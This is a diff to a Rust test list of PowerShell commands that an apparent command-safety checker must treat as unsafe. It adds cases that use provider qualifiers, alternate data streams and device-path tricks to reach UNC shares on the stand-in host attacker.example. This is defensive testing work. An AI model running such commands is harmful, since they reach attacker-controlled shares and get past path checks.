@@ -200,6 +200,12 @@ fn unread_scripts() -> Vec<String> {
         r"Set-Location \\attacker.example\s; Get-ChildItem".into(),
         "Out-Host -Paging -InputObject x".into(),
         "Stop-Process -Name x".into(),
+        // #2709 review r6: PowerShell splits a provider qualifier at its first
+        // `::`, and `..` can climb out of a local device path.
+        r"Get-Content -LiteralPath 'FileSystem::\\attacker.example\share\x::$DATA'".into(),
+        r"Test-Path 'Microsoft.PowerShell.Core\FileSystem::\\attacker.example\s::x'".into(),
+        r"Get-Content -LiteralPath '\\.\C:\..\UNC\attacker.example\s\x'".into(),
+        r"Get-Content -LiteralPath '\\?\UNC\attacker.example\s\x'".into(),
         // #2709 review r2: a source named `.` (`s\.git\.` is `s\.git`), a copy
         // of a folder's contents, a download into a folder the server names.
         r"Copy-Item -Path s\.git\. -Destination . -Recurse -Force".into(),
